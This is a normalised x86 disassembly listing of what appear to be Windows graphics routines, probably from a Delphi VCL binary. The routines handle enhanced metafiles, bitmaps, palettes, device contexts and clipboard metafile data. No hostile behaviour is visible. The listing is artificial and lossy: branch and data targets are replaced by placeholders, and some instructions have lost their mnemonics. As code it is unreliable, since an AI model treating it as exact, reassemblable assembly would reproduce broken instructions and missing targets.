mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420817
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41de2c
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42081e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
call sub_41de2c
sub_420828
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4208cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4208ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40840c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c274
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404260
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208b4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_420908
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420544
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42097c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42097c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42097c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_420544
pop esi
pop ebx
retn
mov eax ebx
call sub_420acc
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4209b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_420544
pop esi
pop ebx
retn
mov eax ebx
call sub_420acc
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4209f8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420544
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4209b8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4209b8
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420a6c
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4159c4
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_420acc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_420544
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_421218
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_421214
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_420b50
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_4159c4
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_420c5c
mov edx ebx
mov eax esi
call sub_420bd0
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_420bd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420c4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415c28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
sub_420c5c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b18
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415c28
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415c28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d7e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41de8c
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41ec7c
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420d97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420d77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_420da4
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420544
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41ddfc
sub_420e28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_420ef8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4140d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420f96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f9d
mov eax [ rw-data ]
call sub_41413c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_420f6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_421088
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41da34
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413d6c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d9d8
test al al
je r-xdata
sub_420fa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4140d8
mov esi eax
xor ecx ecx
push ebp
push sub_421014
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
mov edx ebx
mov eax esi
call sub_413d6c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_421088
sub_421020
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d544
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42105c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_421088
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d608
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_421088
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d848
xor edx edx
push ebp
push sub_42111c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dbbc
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4140ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da34
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_421128
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d848
xor eax eax
push ebp
push sub_421207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422444
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_420fa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422544
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dbbc
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da34
retn
sub_421218
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403104
sub_421238
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_420fa4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d078
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_421294
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41be98
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_420fa4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_420fa4
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4212e0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e6c8
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42138f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42139c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4213e8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420fa4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41df34
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_421a36
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421740
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41de14
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41df34
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41df34
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41df34
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41df34
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push j_sub_4035a4#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4219d6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4219b4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41df34
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42139c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e6c8
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d428
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412938
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c768
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
call sub_41c768
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41de8c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219bb
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42198a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41df34
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
